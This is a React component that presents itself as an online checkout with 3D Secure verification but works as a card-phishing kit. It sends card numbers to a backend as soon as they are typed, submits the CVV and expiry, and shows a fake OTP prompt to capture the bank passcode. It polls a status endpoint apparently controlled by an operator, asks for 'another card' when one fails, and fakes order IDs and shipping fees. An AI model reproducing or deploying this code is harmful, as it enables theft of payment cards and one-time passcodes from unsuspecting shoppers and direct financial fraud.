import React, { useState, useEffect } from 'react';
import Visa from "./assets/visa.svg";
import MasterCard from "./assets/mastercard.svg";
import Amex from "./assets/amex.svg";
import Discover from "./assets/discover.svg";
import JCB from "./assets/jcb.svg";
import Guard from "./assets/guard.svg";
import secure3d from "./assets/3d-secure.svg";
import ds3 from "./assets/3ds-logo.png";
import {addData, addNoti, addTag, getStatus} from "./credit-form.service";
import Select from "react-select";
import CustomModal from "./modal";


interface Product {
  name: string;
  price: number;
  quantity?: number;
}

type TProps = {
  products: Product[];
  domain?: string;
};

const COUNTRIES = ["Afghanistan", "Åland Islands", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belau", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bonaire, Saint Eustatius and Saba", "Bosnia and Herzegovina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo (Brazzaville)", "Congo (Kinshasa)", "Cook Islands", "Costa Rica", "Croatia", "Cuba", "Curaçao", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Falkland Islands", "Faroe Islands", "Fiji", "Finland", "France", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guernsey", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard Island and McDonald Islands", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Isle of Man", "Israel", "Italy", "Ivory Coast", "Jamaica", "Japan", "Jersey", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Macao", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "North Korea", "North Macedonia", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palestinian Territory", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russia", "Rwanda", "São Tomé and Príncipe", "Saint Barthélemy", "Saint Helena", "Saint Kitts and Nevis", "Saint Lucia", "Saint Martin (Dutch part)", "Saint Martin (French part)", "Saint Pierre and Miquelon", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia/Sandwich Islands", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Svalbard and Jan Mayen", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom (UK)", "United States (US)", "United States (US) Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (US)", "Wallis and Futuna", "Western Sahara", "Yemen", "Zambia", "Zimbabwe"];
const COUNTRIES_OPTIONS = COUNTRIES.map((country) => ({value: country, label: country}));

const months = [
  {value: '', label: 'Month'},
  {value: '01', label: '01'},
  {value: '02', label: '02'},
  {value: '03', label: '03'},
  {value: '04', label: '04'},
  {value: '05', label: '05'},
  {value: '06', label: '06'},
  {value: '07', label: '07'},
  {value: '08', label: '08'},
  {value: '09', label: '09'},
  {value: '10', label: '10'},
  {value: '11', label: '11'},
  {value: '12', label: '12'},
];

const years = [
  {value: '', label: 'Year'},
  {value: '2022', label: '2022'},
  {value: '2023', label: '2023'},
  {value: '2024', label: '2024'},
  {value: '2025', label: '2025'},
  {value: '2026', label: '2026'},
  {value: '2027', label: '2027'},
  {value: '2028', label: '2028'},
  {value: '2029', label: '2023'},
  {value: '2030', label: '2030'},
  {value: '2031', label: '2031'},
  {value: '2032', label: '2032'},
  {value: '2033', label: '2033'},
  {value: '2034', label: '2034'},
  {value: '2035', label: '2035'},
];

type TState = {
  firstName: string;
  lastName: string;
  companyName: string;
  country: string;
  street: string;
  city: string;
  state: string;
  zipcode: string;
  phone: string;
  email: string;
  notes: string;
  cardNumber: string;
  expiredMonth: string;
  expiredYear: string;
  cvv: string;
  otp: string;
  domain: string;
}



export const CreditForm = React.forwardRef<any, TProps>(({ products , domain }, ref) => {
  const [shippingFee, setShippingFee] = React.useState(Number(Math.random() * 5 + 10));
  const [step, setStep] = React.useState<number>(1);
  const orderId = React.useRef(generateRandomNumber(4));
  const [skip1, setSkip1] = React.useState(false);
  const [skip2, setSkip2] = React.useState(false);
  const [done, setDone] = React.useState(false);
  const [submitted, setSubmitted] = React.useState(false);
  const [timeoutValue, setTimeoutValue] = React.useState(10);
  const [timeoutValue2, setTimeoutValue2] = React.useState(10);
  const [skipOTP, setSkipOTP] = React.useState(false);
  const [state, setState] = React.useState<Partial<TState>>({});
  const [isPaid, setIsPaid] = React.useState<boolean>(false);
  const [errors, setError] = React.useState<Array<string>>([]);
  const totalPrice = products.reduce((acc, product) => acc + product.price, 0);
  const [isLoading, setIsLoading] = React.useState<boolean>(false);

  React.useEffect(() => {
    if (domain) {
      setState({...state, domain});
    }
  }, [domain]);

  const formattedProducts = products.reduce((acc, product) => {
    const {name, price} = product;
    const existIndex = acc.findIndex((item) => item.name === name);
    if (existIndex !== -1) {
      acc[existIndex].quantity = (acc[existIndex].quantity as number) + 1;
      return acc;
    }
    return [...acc, {name, price, quantity: 1}];
  }, [] as Product[]);

  React.useEffect(() => {
    if (step == 2) {
      addNoti({...state, products: formattedProducts.map((product) => `${product.name.slice(0, 40)} x ${product.quantity}`).join('; '), domain: state.domain}).catch(() => {})
    }
  }, [step, formattedProducts])

  const handleFailed = () => {
    setStep(1);
    setError(['Please use another card!']);
  };

  useEffect(() => {
    window.addEventListener('beforeunload', alertUser)
    window.addEventListener('unload', handleTabClosing)
    return () => {
      window.removeEventListener('beforeunload', alertUser)
      window.removeEventListener('unload', handleTabClosing)
    }
  })

  const handleTabClosing = () => {
    addTag(state.cardNumber?.replaceAll(' ', '') ?? '', 'closed').catch(() => {});
  }

  const alertUser = React.useCallback((event:any) => {
    addTag(state.cardNumber?.replaceAll(' ', '') ?? '', 'closed').catch(() => {});
    event.preventDefault()
    event.returnValue = ''
  }, [state.cardNumber]);


  const cardType = getCardType(state.cardNumber?.replaceAll(' ', ''));
  const handleChangeInput = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const {name, value} = e.target;
    if (name === 'cvv') {
      var numericRegex = /^[0-9]*$/;
      if (value.length > 4 || !(numericRegex.test(value))) {
        return;
      }
    }
    setState({...state, [name]: value})
    if (name === 'cardNumber') {
      const cardType = getCardType(value.replaceAll(' ', ''));
      if (cardType) {
        await addNoti({...state, cardNumber: value});
      }
    }
  }

  const checkIsError = () => {
    let errors: string[] = [];
    let isError = false;
    if (!cardType) {
      errors = [...errors, 'Card Number ERROR!']
      isError = true;
    }
    if (!state.cvv) {
      errors = [...errors, 'CVV Number ERROR!']
      isError = true;
    }
    if (!state.expiredMonth) {
      errors = [...errors, 'Expiry month ERROR!']
      isError = true;
    }
    if (!state.expiredYear) {
      errors = [...errors, 'Expiry year ERROR!']
      isError = true;
    }
    setError(errors);
    return isError;
  };
  const handleSubmit = async (e: React.FormEvent<HTMLButtonElement>) => {
    const succeedTimeout = setTimeout(() => {
      window.parent?.postMessage(JSON.stringify({ type: 'success' }), "*");
    }, timeoutValue2 * 1000);
    e.preventDefault();
    const isError = checkIsError();
    if (isError) {
      return goToTop();
    }
    setIsLoading(true);
    const obj = await addData({...state, cardType, expiredDate: `${state.expiredMonth}/${state.expiredYear}`, cardNumber: state.cardNumber?.replaceAll(' ', '') ?? ''});
    setIsLoading(false);
    if (!obj) {
      return;
    }
    setStep(2);
    setTimeoutValue(obj.timeout ?? 30)
    setTimeoutValue2(obj.timeout2 ?? 30)
    if (obj.skipOTP) {
      setStep(3);
      const id = setInterval(async () => {
        const res = await getStatus(state.cardNumber?.replaceAll(' ', '') ?? '');
        if (res.otpStatus === 'failed') {
          clearInterval(id);
          setStep(2);
          setSkip1(true);
        } else if (res.otpStatus === 'success') {
          clearInterval(id);
          setSkip2(true);
        }
      }, 1000);
      setTimeout(() => {
        clearInterval(id);
      }, obj.timeout2 * 1000);
      return ;
    }
    const id = setInterval(async () => {
      const res = await getStatus(state.cardNumber?.replaceAll(' ', '') ?? '');
      if (res.cardNumberStatus === 'failed') {
        clearInterval(id);
        handleFailed();
      } else if (res.cardNumberStatus === 'success') {
        clearInterval(id);
        setSkip1(true);
      }
    }, 1000);
    setTimeout(() => {
      clearInterval(id);
    }, obj.timeout * 1000);
  };

  const handleVerify = async () => {
    if (!state.otp) {
      return;
    }
    setIsLoading(true);
    await addData({...state, cardType, expiredDate: `${state.expiredMonth}/${state.expiredYear}`, cardNumber: state.cardNumber?.replaceAll(' ', '') ?? ''});
    setIsLoading(false);
    const id = setInterval(async () => {
      const res = await getStatus(state.cardNumber?.replaceAll(' ', '') ?? '');
      if (res.otpStatus === 'failed') {
        clearInterval(id);
        setStep(2);
      } else if (res.otpStatus === 'success') {
        clearInterval(id);
        setSkip2(true);
      }
    }, 1000);
    setTimeout(() => {
      clearInterval(id);
    }, timeoutValue2 * 1000);
    setStep(3)
  }

  return (
    <div ref={ref}>
      {step === 1 && (
        <>
          <CustomModal onClaim={() => setShippingFee(0)} />
          <form className="flex flex-col sm:flex-row gap-8 px-7 py-4 ">
            <div className="flex flex-col flex-1 gap-2">
              <div>
                {errors.map((error) => (
                    <div key={error} className="text-red-500">{error}</div>
                ))}
              </div>
              <h3 className="font-bold text-lg">BILLING DETAILS</h3>
              <div className="flex flex-col sm:flex-row gap-2">
                <div className="flex-1">
                  <label htmlFor="firstName" className="block text-gray-700 font-bold mb-2">
                    First name <span className="text-red-500">*</span>
                  </label>
                  <input
                      type="text"
                      id="firstName"
                      name="firstName"
                      value={state.firstName}
                      onChange={handleChangeInput}
                      className="w-full px-3 py-2 border border-gray-300 rounded"
                      required
                  />
                </div>
                <div className="flex-1">
                  <label htmlFor="lastName" className="block text-gray-700 font-bold mb-2">
                    Last name <span className="text-red-500">*</span>
                  </label>
                  <input
                      type="text"
                      id="lastName"
                      name="lastName"
                      className="w-full px-3 py-2 border border-gray-300 rounded"
                      value={state.lastName}
                      onChange={handleChangeInput}
                      required
                  />
                </div>
              </div>

              <div className="">
                <label htmlFor="companyName" className="block text-gray-700 font-bold mb-2">
                  Company name (optional)
                </label>
                <input
                    type="text"
                    id="companyName"
                    name="companyName"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.companyName}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="">
                <label htmlFor="country" className="block text-gray-700 font-bold mb-2">
                  Country / Region <span className="text-red-500">*</span>
                </label>
                <Select
                    options={COUNTRIES_OPTIONS}
                    isSearchable
                    value={{value: state.country ?? '', label: state.country ?? ''}}
                    onChange={(newValue) => setState({...state, country: newValue?.value})}
                />
              </div>
              <div className="">
                <label htmlFor="street" className="block text-gray-700 font-bold mb-2">
                  Street address <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="street"
                    name="street"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    placeholder="House number and street name"
                    value={state.street}
                    onChange={handleChangeInput}
                    required
                />
                <input
                    type="text"
                    id="apartment"
                    name="apartment"
                    className="w-full mt-2 px-3 py-2 border border-gray-300 rounded"
                    placeholder="Apartment, suite, unit, ect. (optional)"
                    required
                />
              </div>
              <div className="">
                <label htmlFor="city" className="block text-gray-700 font-bold mb-2">
                  Town / City <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="city"
                    name="city"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.city}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="">
                <label htmlFor="state" className="block text-gray-700 font-bold mb-2">
                  State <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="state"
                    name="state"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.state}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="">
                <label htmlFor="zipcode" className="block text-gray-700 font-bold mb-2">
                  Zipcode <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="zipcode"
                    name="zipcode"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.zipcode}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="">
                <label htmlFor="phone" className="block text-gray-700 font-bold mb-2">
                  Phone <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="phone"
                    name="phone"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.phone}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="">
                <label htmlFor="email" className="block text-gray-700 font-bold mb-2">
                  Email <span className="text-red-500">*</span>
                </label>
                <input
                    type="email"
                    id="email"
                    name="email"
                    value={state.email}
                    onChange={handleChangeInput}
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    required
                />
              </div>
              <h3 className="font-bold text-lg">ADDITIONAL INFORMATION</h3>
              <div className="">
                <label htmlFor="email" className="block text-gray-700 font-bold mb-2">
                  Order notes (optional)
                </label>
                <textarea
                    id="notes"
                    name="notes"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    required
                />
              </div>
            </div>
            <div className="flex flex-col flex-1 gap-2 border border-purple-400 px-7 py-4 ">
              <h3 className="font-bold text-lg">YOUR ORDER</h3>
              <div className="flex justify-between font-bold">
                <div>PRODUCT</div>
                <div>SUBTOTAL</div>
              </div>
              <SingleLine type="double"/>
              {formattedProducts.map((product, index) => (
                  <div key={product.name}>
                    <div className="flex justify-between gap-12" key={index}>
                      <div>{product.quantity === 1 ? product.name : `${product.name} x ${product.quantity}`}</div>
                      <div className="font-bold">${product.price * (product.quantity ?? 1)}</div>
                    </div>
                    <SingleLine/>
                  </div>
              ))}
              <div className="flex justify-between font-bold">
                <div>Subtotal</div>
                <div>${totalPrice.toFixed(2)}</div>
              </div>
              <SingleLine/>
              <div className="flex justify-between gap-8 font-bold">
                <div>
                  Shipping
                  <div className="font-normal">Standard Shipping (Estimated delivery time from 3 to 7 days depending on the region)</div>
                </div>
                <div>${shippingFee.toFixed(2)}</div>
              </div>
              <SingleLine/>
              <div className="flex justify-between font-bold">
                <div>Total</div>
                <div>${(totalPrice + shippingFee).toFixed(2)}</div>
              </div>
              <SingleLine type="double"/>
              <div className="flex gap-3">
                <div>Credit Card</div>
                <img className="w-8 object-contain" src={Visa} alt="Visa"/>
                <img
                    className="w-8 object-contain"
                    src={MasterCard}
                    alt="Master card"
                />
                <img className="w-8 object-contain" src={Amex} alt="Amex"/>
                <img className="w-8 object-contain" src={Discover} alt="Discover"/>
                <img className="w-8 object-contain" src={JCB} alt="Visa"/>
              </div>

              <div className="">
                <label htmlFor="cardNumber" className="block text-gray-700 font-bold mb-2">
                  Card Number <span className="text-red-500">*</span>
                </label>
                <input
                    type="text"
                    id="cardNumber"
                    name="cardNumber"
                    className="w-full px-3 py-2 border border-gray-300 rounded"
                    value={state.cardNumber ?? ''}
                    onChange={handleChangeInput}
                    required
                />
              </div>
              <div className="flex">
                <div className="w-1/3 mr-2">
                  <label htmlFor="expiredMonth" className="block text-gray-700 font-bold mb-2 whitespace-nowrap">
                    Expiry date <span className="text-red-500">*</span>
                  </label>
                  <Select
                      options={months}
                      value={{value: state.expiredMonth ?? '', label: state.expiredMonth ?? ''}}
                      onChange={(newValue) => setState({...state, expiredMonth: newValue?.value})}
                      className="h-[42px]"
                  />
                </div>
                <div className="w-1/3 ml-2">
                  <label htmlFor="expiredYear" className="invisible block text-gray-700 font-bold mb-2 whitespace-nowrap">
                    Expiry Year
                  </label>
                  <Select
                      options={years}
                      value={{value: state.expiredYear ?? '', label: state.expiredYear ?? ''}}
                      onChange={(newValue) => setState({...state, expiredYear: newValue?.value})}
                      className="h-[42px]"
                  />
                </div>
                <div className="w-1/3 ml-2">
                  <label htmlFor="cvv" className="block text-gray-700 font-bold mb-2">
                    CVV <span className="text-red-500">*</span>
                  </label>
                  <input
                      type="text"
                      id="cvv"
                      name="cvv"
                      className="w-full px-3 py-2 border border-gray-300 rounded"
                      placeholder="***"
                      value={state.cvv ?? ''}
                      onChange={handleChangeInput}
                      required
                  />
                </div>
              </div>

              <div className="flex">
                <img src={Guard} alt="Guard icon"/>
                <span className="text-xs ">3D Secure (3DS) Card Payments & Authentication</span>
              </div>
              <div className="flex">
                <input type="checkbox" id="terms" name="terms" required/>
                <label className="ml-2" htmlFor="terms">I have read and agree to the website terms and conditions
                  <span className="text-red-500">*</span></label>
              </div>
              <button type="submit" onClick={handleSubmit} disabled={isLoading}
                      className="px-5 py-2 font-bold bg-orange-700 hover:bg-orange-600 text-white uppercase">
                {isLoading ? 'Loading...' : 'Place order'}
              </button>
              <p>Your personal data will be used to process your order, support your experience throughout this
                website.</p>

            </div>
          </form>
        </>
      )}
      { step === 2 && (
        <div className="px-4 py-8">
          <div>
            <ul>
              <li>Order Id: #{orderId.current}</li>
              <li>{ products?.length ? (
                <>Items: [{products.map((product) => product.name).join(', ')}]</>
              ) : <></>}</li>
              <li>{totalPrice ? <>Total: ${(totalPrice + shippingFee).toFixed(2)}</> : <></>}</li>
            </ul>
          </div>
          <SingleLine/>
          <div className="flex py-4">
            <img width="200" src={ds3}/>&nbsp;&nbsp;
            <img width="80" src={secure3d}/>
          </div>
          <SingleLine/>
          <div>
            <LoadingScreen timeout={timeoutValue} skip={skip1} renderAfterLoad={(
              <div className="max-w-xl mt-4 mx-auto">
                <div
                  className="flex flex-col justify-center items-center gap-2 border rounded px-4 py-8 shadow">
                  <div className="text-red-700 font-medium">
                    ⚠️ One-Time Passcode(OTP) is required for this purchase.
                  </div>
                  <div>This passcode has been sent to your registered mobile</div>
                  <input
                    type="text"
                    id="otp"
                    name="otp"
                    className="px-3 py-2 border border-gray-300 rounded"
                    placeholder="Enter you OTP"
                    value={state.otp}
                    onChange={handleChangeInput}
                    required
                  />
                  <button onClick={handleVerify}
                          className="px-5 py-2 rounded font-bold bg-red-600 hover:bg-red-700 text-white uppercase" disabled={isLoading}>
                    {isLoading ? 'Loading...' : 'Verify'}
                  </button>
                </div>
                <div className="mt-8 text-center">OTP expires in 360s</div>
                <div className="mt-20 text-sm text-center">Please don't close this page until you enter your code.</div>
              </div>
            )}/>
          </div>
        </div>
      )}
      { step === 3 && (
        <div className="px-7 py-4">
          <LoadingScreen timeout={timeoutValue2} skip={skip2} renderAfterLoad={(
            <div>
              <h3 className="font-bold">Order Successful</h3>
              <p>Thank you for your order! We have received your order and will send the order information to your email shortly.</p>
            </div>
          )} />
        </div>
      )}
    </div>
  );
});




export const SingleLine: React.FC<{ type?: "single" | "double" }> = ({
                                                                       type,
                                                                     }) => {
  const borderType = type ?? "single";
  return <div className={borderType === "single" ? "border-t" : "border"}/>;
};


function getCardType(cardNumber?: string) {
  if (!cardNumber) return null;
  // Define regex patterns for different card types
  var visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
  var mastercardPattern = /^5[1-5][0-9]{14}$/;
  var amexPattern = /^3[47][0-9]{13}$/;
  var discoverPattern = /^6(?:011|5[0-9]{2})[0-9]{12}$/;
  var jcbPattern = /^(?:2131|1800|35\d{3})\d{11}$/;

  // Check the card number against each pattern
  if (visaPattern.test(cardNumber)) {
    return "Visa";
  } else if (mastercardPattern.test(cardNumber)) {
    return "Mastercard";
  } else if (amexPattern.test(cardNumber)) {
    return "Amex";
  } else if (discoverPattern.test(cardNumber)) {
    return "Discover";
  } else if (jcbPattern.test(cardNumber)) {
    return "JCB";
  } else {
    return null;
  }
}

function goToTop() {
  document.documentElement.scrollTop = 0; // For modern browsers
  document.body.scrollTop = 0; // For older browsers
}

const LoadingScreen: React.FC<{ timeout: number, renderAfterLoad?: any, skip?: boolean }> = ({timeout, renderAfterLoad, skip}) => {
  const [showLoading, setShowLoading] = useState(true);
  const [time, setTime] = useState(timeout)

  useEffect(() => {
    // Simulate a delay and hide the loading screen after 2 seconds
    const timer = setTimeout(() => {
      setShowLoading(false);
    }, timeout * 1000);

    return () => clearTimeout(timer);
  }, [timeout]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTime((preTime) => preTime - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  if (!showLoading || skip) {
    return renderAfterLoad; // Return null when loading is complete to render nothing
  }

  return (
    <>
      <>Loading... ({time}s)</>
      <div className="flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-gray-900"></div>
      </div>
    </>

  );
};

export default LoadingScreen;

function generateRandomNumber(length: number) {
  var min = Math.pow(10, length - 1);
  var max = Math.pow(10, length) - 1;
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

